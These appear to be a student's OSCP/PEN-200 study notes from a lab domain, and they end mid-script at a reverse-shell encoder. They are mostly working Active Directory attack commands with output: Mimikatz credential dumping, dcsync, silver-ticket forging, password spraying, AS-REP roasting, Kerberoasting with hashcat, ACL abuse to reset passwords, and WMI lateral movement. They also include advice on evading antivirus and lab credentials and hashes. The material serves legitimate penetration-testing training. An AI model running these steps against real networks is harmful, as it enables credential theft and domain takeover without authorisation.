$dirsearcher.filter="samAccountType=**805306368**"
$dirsearcher.FindAll()
##provided all the users
$result=$dirsearcher.FindAll()
Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
    $prop
    }
    Write-Host "-----------------------------------------------------------------"
}
##script will search through AD and Filter the results based on samAccountType of Choosing
$PDC=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN=([adsi]'').distinguishedName
$LDAP="LDAP://$PDC/$DN"
$direntry=New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher=New-Object SYstem.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="name=jen" (#change the username based on the above list)
$result=$dirsearcher.FindAll()
Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }
    Write-Host "-------------------------------"
}
```

LDAP Search functionality

```markdown
##funtion.ps1
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
##Import-Module .\function.ps1
>LDAPSearch -LDAPQuery "(samAccountType=805306368)" (#It will provide all users)
>LDAPSearch -LDAPQuery "(objectclass=group)" (#It will provide all groups information)
>foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {$group.properties | select {$_.cn},{$_.member}}
>net group "Sales Department /domain"
##It reveled 2 users pete, stephanie
>$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=sales Department))"
> $sales.properties.member
##It reveled 3 users Development Department, pete, stephanie (Nested Group)
>$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
>$group.properties.member
>$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Management Department*))"
>$group.properties.member
```

### AD Enumeration with PowerView

So far we have only scratched the surface of Active Directory enumeration by mostly focusing on users and groups. While the tools we have used so far have given us a good start and an understanding of how we can communicate with AD and obtain information, other researchers have created more elaborate tools the same purpose. One popular option is the PowerView powershell script, which includes many functions to improve the effectiveness of our enumeration.

```markdown
PS>powershell -ep bypass
>Import-Module .\PowerView.ps1
>Get-NetDomain
>Get-NetUser
>Get-NetUser fred
>Get-NetUser | select cn
>Get-NetUser | select cn,pwdlastset,lastlogon
>Get-NetGroup
>Get-NetGroup | select cn
>Get-NetGroup "Sales Department" | select member
```

## Manual Enumeration - Expanding our Repertoire

1. Enumerate Operating Systems
2. Enumerate permissions and logged on users
3. Enumerate through Service Principal Names
4. Enumerate Object Permissions
5. Explore Domain Shares

### Enumerate Operating Systems

```bash
PS>powershell -ep bypass
>Import-Module .\PowerView.ps1
>Get-NetComputer
>Get-NetComputer | select operatingsystem,dnshostname
```

### Getting an Overview - Permissions and Logged on Users

Now that we have a clear list of computers, users, and groups in  the domain, we will continue our enumeration and focus on the relationships between as many objects as possible. These relationships often play a key role during an attack, and our goal is to build a map of the domain to find potential attack vectors.

> When an attacker or penetration tester improves access through multiple higher-level accounts to reach a goal, it is know as a **chined compromise.**
> 

 PowerView's ***Find-LocalAdminAccess*** command scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain. The command relies on the ***OpenServiceW function***,[1](https://portal.offsec.com/courses/pen-200-44065/learning/active-directory-introduction-and-enumeration-45847/manual-enumeration-expanding-our-repertoire-46014/getting-an-overview-permissions-and-logged-on-users-45856#fn-local_id_543-1) which will connect to the ***Service Control Manager* (SCM)** on the **target machines**. The **SCM essentially maintains a database of installed services and drivers** on Windows computers. PowerView will attempt to open this database with the *SC_MANAGER_ALL_ACCESS* access right, which **require administrative privileges**, and if the connection is successful, PowerView will deem that our current user has administrative privileges on the target machine.

According to the documentation for *NetSessionEnum*,[3:1](https://portal.offsec.com/courses/pen-200-44065/learning/active-directory-introduction-and-enumeration-45847/manual-enumeration-expanding-our-repertoire-46014/getting-an-overview-permissions-and-logged-on-users-45856#fn-local_id_543-3) there are five possible query levels: **0,1,2,10,502**. Level 0 only returns the **name of the computer** establishing the session. Levels 1 and 2 return **more information but require administrative** privileges. This leaves us with Levels 10 and 502. Both should return information such as the **name of the computer and name of the user** establishing the connection. **By default, PowerView uses query level 10 with *NetSessionEnum.***

> The permissions required to enumerate sessions with *NetSessionEnum* are defined in the **SrvsvcSessionInfo** registry key, which is located in the **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity** hive.
> 

```markdown
PS>powershell -ep bypass
>Import-Module .\PowerView.ps1
>Find-LocalAdminAccess
>Get-NetSession -ComputerName files04
>Get-NetSession -ComputerName web04
>Get-NetSession -ComputerName files04 -Verbose
>Get-NetSession -ComputerName web04 -Verbose
>Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
>Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
>.\PsLoggedon.exe \\files04
>.\PsLoggedon.exe \\web04
>.\PsLoggedon.exe \\client74
##Open WIndows Machine connect to remote desktop from windows OS
```

### Enumeration Through Service Principal Names

**Service Principal Names (SPNs)** are unique identifiers for services running on servers within a network. They are used by Kerberos authentication to associate a service instance with a service logon account. This association is essential for clients to authenticate to the service using Kerberos.
**we'll shift our focus to *Service Accounts*,[1](https://portal.offsec.com/courses/pen-200-44065/learning/active-directory-introduction-and-enumeration-45847/manual-enumeration-expanding-our-repertoire-46014/enumeration-through-service-principal-names-45857#fn-local_id_677-1) which may also be members of high-privileged groups**.

```markdown
>setspn -L iis_service
Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
        HTTP/web04.corp.com
        HTTP/web04
        HTTP/web04.corp.com:80
>Get-NetUser -SPN | select samaccountname,serviceprincipalname
samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw
iis_service    {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
>nslookup.exe web04.corp.com
Server:  UnKnown
Address:  192.168.50.70

Name:    web04.corp.com
Address:  192.168.50.72
##check the web browser for the 192.168.50.72 it has some login form
```

### Enumerating Object Permission

In short, an object in AD may have a set of permissions applied to it with multiple *Access Control Entries* (ACE).[1](https://portal.offsec.com/courses/pen-200-44065/learning/active-directory-introduction-and-enumeration-45847/manual-enumeration-expanding-our-repertoire-46014/enumeration-through-service-principal-names-45857#fn-local_id_880-1) These ACEs make up the *Access Control List* (ACL).[2](https://portal.offsec.com/courses/pen-200-44065/learning/active-directory-introduction-and-enumeration-45847/manual-enumeration-expanding-our-repertoire-46014/enumeration-through-service-principal-names-45857#fn-local_id_880-2) Each ACE defines whether access to the specific object is allowed or denied.

> list of the most interesting ones along with a description of the permissions they provide:
> 
> 
> ```
> GenericAll: Full permissions on object
> GenericWrite: Edit certain attributes on the object
> WriteOwner: Change ownership of the object
> WriteDACL: Edit ACE's applied to object
> AllExtendedRights: Change password, reset password, etc.
> ForceChangePassword: Password change for object
> Self (Self-Membership): Add ourselves to for example a group
> ```
> 

```bash
>PS C:\Tools> Get-ObjectAcl -Identity stephanie

...
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 16
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None
##Object permissions
>Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
>Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers
>Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
S-1-5-32-548                                             GenericAll
S-1-5-18                                                 GenericAll
S-1-5-21-1987370270-658905905-1781884369-519             GenericAll
>"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
>net group "Management Department" stephanie /add /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.
>Get-NetGroup "Management Department" | select member
member
------
{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
>net group "Management Department" stephanie /del /domain
>Get-NetGroup "Management Department" | select member
member
------
CN=jen,CN=Users,DC=corp,DC=com,
```

### Enumerating Domain Shares

Domain shares often contain critical information about the environment, which we can use to our advantage.

```markdown
>Find-DomainShare
>Find-DomainShare -CheckShareAccess
>ls \\dc1.corp.com\sysvol\corp.com\
>ls \\dc1.corp.com\sysvol\corp.com\Policies\
>cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
##cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
>kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
>ls \\FILES04\docshare\
>cat \\FILES04\docshare\docs\do-not-share\start-email.txt
>cat \\FILES04\docshare\docs\do-not-share\start-email.txt
>ls \\FILES04\'Important Files'\
##If their is space between the file name mention in single quote like above
```

## AD - Automated Enumeration - SharpHound, BloodHound

1. Collect domain data using SharpHound
2. Analyze the data using BloodHound

### Collect domain data using SharpHound

*SharpHound* to collect the data. SharpHound is written in C# and uses Windows API functions and LDAP namespace functions similar to those we used manually in the previous sections. For example, SharpHound will attempt to use *NetWkstaUserEnum* and *NetSessionEnum* to enumerate logged-on sessions, just as we did earlier. It will also run queries against the Remote Registry service, which we also leveraged earlier.

```markdown
>Import-Module .\Sharphound.ps1
>Get-Help Invoke-BloodHound
>Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
>sudo neo4j start
>bloodhoud
#SSH Transfer files windows to kali linux
> sudo service ssh start (Kali)
Windows>scp Database.kdbx kali@192.168.45.155:/home/kali/Desktop/HTB/OSCP(Windows)
>Get-ObjectAcl -Identity CLIENT75
>Get-ObjectAcl -Identity "CLIENT75" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
>"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
>net user robert password123! /domain
>runas /user:corp\robert cmd.exe
```

1. **Capstone Exercise**: Start VM Group 2 and log in as *stephanie* to CLIENT75. From CLIENT75, enumerate the object permissions for the domain users. Once weak permissions have been identified, use them to take full control over the account and use it to log in to the domain. Once logged in, repeat the enumeration process using techniques shown in this Module to obtain the flag. **HINTS**

1. Bloodhound data might show Stephanie has a first-degree object control.
2. Powerview could also be used to find any exciting domain Acl Stephanie has.
3. Does the new user have local admin access?

> First login as Stephanie user with xfreerdp command after that run a sharphound and bloodhound command identified Stephanie user(Logged in CLIENT75) has GenericAll permission for Robert user based on that changed the password using >**net user robert password123! /domain** and the changing the user by >**runas /user:corp\robert cmd.exe**, From CLIENT75 Remote Desktop Connection logged in as (192.168.165.74(CLIENT74)robert/password123!) then logged in as CLIENT74 here run the >**Find-LocalAdminAccess** command to find which user has admin privilege, robert have admin permission for CLIENT74, open administrator folder got the flag in his desktop.
> 

# 22 Attacking Active Directory Authentication

1. Understanding Active Directory Authentication
2. Performing Attacks on Active Directory Authentication

## Understanding Active Directory Authentication

1. Understanding NTLM Authentication
2. Understanding Kerberos Authentication
3. Become familiar with cached AD Credentials

Active Directory supports multiple authentication protocols and techniques that implement authentication to **Windows computers as well as those running Linux and macOS**.

> AD supports several older protocols including **WDigest**. While these may be useful for older operating systems like **windows 7, Server 2012 R2**, we will only focus more modern authentication protocols in this learning Unit
> 

### NTLM Authentication

However, it is considered a *fast-hashing* algorithm since short passwords can be cracked quickly using modest equipment.

> *By using cracking software like Hashcat with top-of-the-line graphic processors, it is possible to test over 600 billion NTLM hashes every second. This means that eight-character passwords may be cracked within 2.5 hours and nine-character passwords may be cracked within 11 days.*
> 

![Untitled](Untitled%2084.png)

### Kerberos Authentication

The Kerberos authentication protocol used by Microsoft is adopted from Kerberos version 5 created by MIT. Kerberos has been used as Microsoft's primary authentication mechanism since Windows Server 2003. While NTLM authentication works via a challenge-and-response paradigm, Windows-based Kerberos authentication uses a ticket system.

![Untitled](Untitled%2085.png)

### Cached AD Credentials

> *In the following example, we will run Mimikatz as a standalone application. However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the Antivirus Evasion Module instead. For example, execute **Mimikatz directly from memory using an injector like PowerShell,or use a built-in tool like Task Manager to dump the entire LSASS process memory**, move the dumped data to a helper machine, and then load the data into Mimikatz.*
> 

```markdown
>xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.165.75
>.\mimikatz.exe
>privilege::debug
>sekurlsa::logonpasswords
##dave
NTLM     : 08d7a47a6f9f66b97b1bae4178747494
SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
##jeff
NTLM     : 2688c6d2af5e9c7ddb268899123744ea
SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
>dir \\web04.corp.com\backup
>sekurlsa::tickets (#we can see the jeff attempt to communicate with web04 server)
##Rely on Mimicatz for crypto API
>crypto::capi
>crypto::cng
```

## Performing Attacks on Active Directory Authentication

1. Use password attacks to obtain valid user credentials (Password Attacks)
2. Abuse enabled user account options(AS-REP Roasting)
3. Abuse the Kerberos SPN authentication mechanism(Kerberoasting)
4. Forge service tickets(Silver Tickets)
5. Impersonate a domain controller to retrieve any domain user credentials(Domain Controller Synchronization)

### Password Attacks

First understand the account lockout policy, if their is too many attempts might block the accounts, For this case it case Lockout duration 30 minutes and threshold is 5 times, you can try 4 times with in 30 minutes without any issues.

Below tools are good when their is no account lockout threshold

Ways to password spraying in Active Directory

1. Script Spray-Passwords.ps1 -Windows
2. Crackmapexec - Kali
3. kerbrute_windows_amd64.exe -Windows

```markdown
PS>net accounts
##One Scripts
>$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
>$PDC = ($domainObj.PdcRoleOwner).Name
>$SearchString = "LDAP://"
>$SearchString += $PDC + "/"
>$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
>$SearchString += $DistinguishedName
>New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
##End of One script, You need to enter correct crentials then it will provide domain name
>powershell -ep bypass
>.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
>cat users.txt
dave
jen
pete
kali>crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:Nexus123!
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
>crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
##dave local admin of CLIENT75 (Pwn3d!)
>.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
2022/09/06 20:30:48 >   dc1.corp.com:88
2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
```

### AS-REP Roasting

As we have discussed, the first step of the authentication process via Kerberos is to send an AS-REQ. Based on this request, the domain controller can validate if the authentication is successful. If it is, the domain controller replies with an AS-REP containing the **session key and TGT**. This step is also commonly referred to as ***Kerberos preauthentication*** and prevents offline password guessing.

> If you have **username and password for one user you can below methods to get password another user who logged into the system.**
> 

```markdown
kali>impacket-GetNPUsers -dc-ip 192.168.165.70  -request -outputfile hashes.asreproast corp.com/pete
kali>hashcat --help | grep -i "Kerberos"
kali>sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
kali>sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt  --force
##Windows
PS>.\Rubeus.exe asreproast /nowrap
kali>sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt  --force
##NextLab
>impacket-GetNPUsers -dc-ip 192.168.221.70 -output hash.aseproast -request corp.com/pete (#Password-Nexus123!)
PS>.\Rubeus.exe asreproast /nowrap
>PS>.\Rubeus.exe asreproast 
##Got 2 users dave and jen(Answer-Summerland1)
```

### Kerberoasting

Let's recall how the Kerberos protocol works. We know that when a user wants to access a resource hosted by a **Service Principal Name (SPN)**, the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN.

When requesting the service ticket from the domain controller, **no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.**

These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.

> If you have **username and password for one user you can below methods to get password another user who logged into the system.**
> 

> The service ticket is encrypted using the SPN’s password hash, If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as Kerberoasting.
> 

```markdown
>impacket-GetUserSPNs -request -dc-ip 192.168.221.70 corp.com/pete
>xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.221.75
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
##Identided iis_service hash
>hashcat -m 13100 corp_audit_Sharphound/iis_kerberoasting2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
##Password-Strawberry1
##NextLab
Once VM Group 2 is started, the domain corp.com has been slightly modified. Use the 
techniques from this section to obtain another plaintext password by performing Kerberoasting
and enter it as answer to this exercise. To crack the TGS-REP hash, create and utilize 
a rule file which adds a "1" to the passwords of rockyou.txt. To perform the attack, you 
can use the user jeff with the password HenchmanPutridBonbon11.
>xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.221.75
>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
>impacket-GetUserSPNs -request -dc-ip 192.168.221.70 corp.com/jeff
>echo '$1' > append1.rule
>hashcat -m 13100 corp_audit_Sharphound/pete_kerberoasting2 rockyou.txt -r corp_audit_Sharphound/append1.rule --force
##Password-MattLovesAutumn1
```

Let's assume that we are performing an assessment and notice that we have ***GenericWrite* or *GenericAll* permissions[7](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/kerberoasting-46108#fn-local_id_473-7) on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user,[8](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/kerberoasting-46108#fn-local_id_473-8) kerberoast the account, and crack the password hash in an attack named *targeted Kerberoasting*. We'll note that in an assessment, we should delete the SPN once we've obtained the hash** to avoid adding any potential vulnerabilities to the client's infrastructure.

### Sliver Tickets

Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user’s permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the the application in a majority of environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known as the service account and the domain controller.

*Privileged Account Certificate* (PAC)[1](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/silver-tickets-46109#fn-local_id_434-1) validation[2](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/silver-tickets-46109#fn-local_id_434-2) is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately for this attack technique, service applications rarely perform PAC validation.

As an example, if we authenticate against an IIS server that is executing in the context of the service account *iis_service*, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.

With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. The custom-created ticket is known as a **sliver ticket** and if the service principal name is used on multiple servers, the sliver tickets can be leveraged against them all.

```markdown
>xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.221.75
##Open powershell with admin privilege
>.\mimicatz.exe
mimicatz>privilege::debug
mimicatz>sekurlsa::logonpasswords
##NTLM of IIS_Service-4d28cf5252d39971419580a51484ca09
>whoami /user (#SID- S-1-5-21-1987370270-658905905-1781884369)
mimicatz>kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
>Invoke-WebRequest -UseDefaultCredentials http://web04 | Select-String -Pattern "OS{"
```

### Domain Controller Synchronization

In production environments, domains typically rely on more than one domain controller to provide redundancy. The *Directory Replication Service* (DRS) Remote Protocol[1](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/domain-controller-synchronization-46110#fn-local_id_526-1) uses *replication*[2](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/domain-controller-synchronization-46110#fn-local_id_526-2) to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the *IDL_DRSGetNCChanges*[3](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/domain-controller-synchronization-46110#fn-local_id_526-3) API.
The dcsync attack is a powerful technique to obtain any domain user credentials. As a bonus, we can use it from both Windows and Linux. By impersonating a domain controller, we can use replication to obtain user credentials from a domain controller. **However, to perform this attack, we need a user that is a member of *Domain Admins*, *Enterprise Admins*, or *Administrators*,** because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.

```markdown
>xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.221.75
PS>.\mimikatz.exe
PS>lsadump::dcsync /user:corp\dave
PS>lsadump::dcsync /user:corp\Administrator
kali>hashcat -m 1000 hashes.dcsync rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
##hash-08d7a47a6f9f66b97b1bae4178747494:Flowers1   
kali>impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.221.70
```

### Capstone Exercise

Once VM Group 2 is started, the domain *corp.com* has been modified. Use the techniques from this Module to obtain access to the user account *maria* and log in to the domain controller. To perform the initial enumeration steps you can use *pete* with the password *Nexus123!*. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, create and utilize a rule file which adds nothing, a "1", or a "!" to the passwords of **rockyou.txt**.

```markdown
> xfreerdp /cert-ignore /u:pete /d:corp.com /p:Nexus123! /v:192.168.193.72
>.\Rubus.exe asreproast (dave , mike-Darkness1099! users)
>.\Rubus.exe kerberoast (#Got iis_service)
##Hints - Opened
1.Perform credential roasting on specific users within the DC.
2.Crack the hash using a custom rule with hashcat.
3.Spray the new credential across all machines using crackmapexec.
4.Use mimikatz to perform post-exploitation and try logging into DC1.
>xfreerdp /cert-ignore /u:mike /d:corp.com /p:Darkness1099! /v:192.168.193.75
##Open powershell with Admin Access
PS>.\mimicatz.exe
>privilege::debug
>sekurlsa::logonpasswords
## maria-passwordt_1415
## From the 192,168.193.75 machine open Remote Desktop, with those creds(maria-passwordt_1415)

**First loggedin with pete(dave,mike hashes) from 72 -> login with mike user to 75
got maria ntlm using mimicatz then using remote desktop login to 70 (Domain Controller)**
```

### Capstone

**Capstone Exercise**: Once VM Group 3 is started, the domain *corp.com* has been modified. By examining leaked password database sites, you discovered that the password *VimForPowerShell123!* was previously used by a domain user. Spray this password against the domain users *meg* and *backupuser*. Once you have identified a valid set of credentials, use the techniques from this Module to obtain access to the domain controller. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, reuse the rule file from the previous exercise.

```markdown
>crackmapexec smb 192.168.193.70 -u AD/users.txt  -p 'VimForPowerShell123!' -d corp.com --continue-on-success
>impacket-GetUserSPNs -request -dc-ip 192.168.193.70 dc1.corp.com/meg(VimForPowerShell123!)
##Got tgs-rep iis_service, backupuser
>crackmapexec smb 192.168.193.75 -u AD/users.txt  -p 'VimForPowerShell123!' -d corp.com --continue-on-success
>impacket-GetUserSPNs -request -dc-ip 192.168.193.70 corp.com/meg
## iis_service - Strawberry1, backupuser - DonovanJadeKnight1
1.Spray the given password with crackmapexec until we find a valid domain user.
2.Once a valid login is found, look for SPNs using impacket's "GetUserSPNs.py".
3.Crack the hash using the same rule in the previous exercise.
>xfreerdp /cert-ignore /u:backupuser /d:corp.com /p:'DonovanJadeKnight1' /v:192.168.193.75
## From this machine to login 70 DCmachine got flag
**First we have 2 users, using crackmapexec find valid credentials, later using 
impacket-GetUserSPNs found 2(iis_service, backupuser) hashes, using backupuser(Domain Admins group)
logged into 75 machine then remote desktop login as 70 DC got the flag**
```

# 23 Lateral Movement in Active Directory

In previous modules, we located high-values targets that could lead to an Active Directory compromise and found the workstations or servers they are logged in to. We gathered password hashes  then recovered and leveraged existing tickets for Kerberos authentication.

Now, we will use lateral movement techniques to compromise the machines on which these high-value domain users are logged in.

A logical next step in our approach would be to crack any password hashes we have obtained and authenticate to a machine with clear text passwords to gain unauthorized access. However, password cracking takes time and may fail. In addition, Kerberos and NTLM do not use the clear text password directly, and native tools from Microsoft do not support authentication using password hash.

1. Active Directory Lateral Movement Techniques
2. Active Directory Persistence

## Active Directory Lateral Movement Techniques

- Understanding WMI, WinRS and WinRM lateral movement techniques
- Abuse PSExec for lateral movement
- Learn about Pass The Hash and Overpass The Hash as lateral movement techniques
- Misuse DCOM to move laterally

Lateral Movement is a tactic consisting of various techniques aimed at gaining further access within the target network. As described in the MITRE Framework, these techniques may use the current valid account or reuse authentication material such as password hashes, Kerberos tickets, and application access tokens obtained from the previous attack stages.

In this Learning Unit, we are going to explore various techniques that involve both valid accounts and previously retrieved credentials.

Additionally, it’s important to note that the knowledge we’ve gained about enumerating Active Directory domains remains relevant in the movement attack phase, as we may have acquired access to previously undiscovered networks.

### WMI and WinRM

The first lateral movement technique we are going to cover is based on [*Windows Management Instrumentation*](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), which is an object-oriented feature that facilitates task automation.

WMI is capable of creating processes via the *Create* method from the *Win32_Process* class. It communicates through [*Remote Procedure Calls*](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.

To demonstrate this attack technique, we'll first briefly showcase the *wmic* utility, which has been **[recently deprecated](https://docs.microsoft.com/en-us/windows/deployment/planning/windows-10-deprecated-features),** and then **we'll discover how to conduct the same WMI attack via PowerShell.**

```markdown
>xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.216.75
cmd>wmic /node:192.168.216.73 /user:jen /password:Nexus123! process call create "calc"
##Checking calculator opened or not
>xfreerdp /cert-ignore /u:jen /d:corp.com /p:'Nexus123!' /v:192.168.216.73 
##
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.216.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
$Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
##
##KaliLinux encode.py --Reverse Shell code 
import sys
import base64
